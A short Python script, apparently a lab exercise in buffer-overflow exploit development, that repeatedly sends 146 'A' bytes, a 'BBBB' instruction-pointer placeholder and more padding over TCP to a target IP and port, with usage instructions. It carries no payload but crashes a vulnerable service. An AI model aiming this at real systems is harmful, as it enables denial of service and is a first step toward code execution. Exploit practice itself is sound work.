import socket
import sys

# how to execute:
# python overflow.py 192.168.1.109 31337

ip = sys.argv[1]
port = int(sys.argv[2])

junk = ("A" * 146)

eip = "BBBB"

exploit = junk + eip + junk

# sending exploit
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print("Fuzzing: " + str(len(exploit)))
        s.send(exploit + "\n")
        s.recv(1024)
        s.close()
    except:
        sys.exit(0)
